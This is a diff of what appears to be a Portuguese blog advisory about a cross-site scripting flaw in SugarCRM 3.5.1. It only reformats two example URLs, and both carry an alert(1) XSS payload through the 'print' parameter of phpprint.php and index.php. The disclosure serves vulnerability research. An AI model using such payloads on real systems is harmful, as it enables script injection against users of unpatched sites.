@@ -47,8 +47,8 @@ A index do sugarCRM 3.5.1 faz um include do phpprint.php, então, esse xss pode 
 {% endhighlight %}
 
 
-<code>url example 1 = http://vulnerable/phpprint.php?print=a&"/><xss>alert(1)</xss></code>
-<code>url example 2 = http://vulnerable/index.php?action=Login&module=Users&print=a&"/><xss>alert(1)</xss></code>
+{% highlight javascript %} url example 1 = http://vulnerable/phpprint.php?print=a&"/><xss>alert(1)</xss>{% endhighlight %}
+{% highlight javascript %} url example 2 = http://vulnerable/index.php?action=Login&module=Users&print=a&"/><xss>alert(1)</xss>{% endhighlight %}
 
 
 
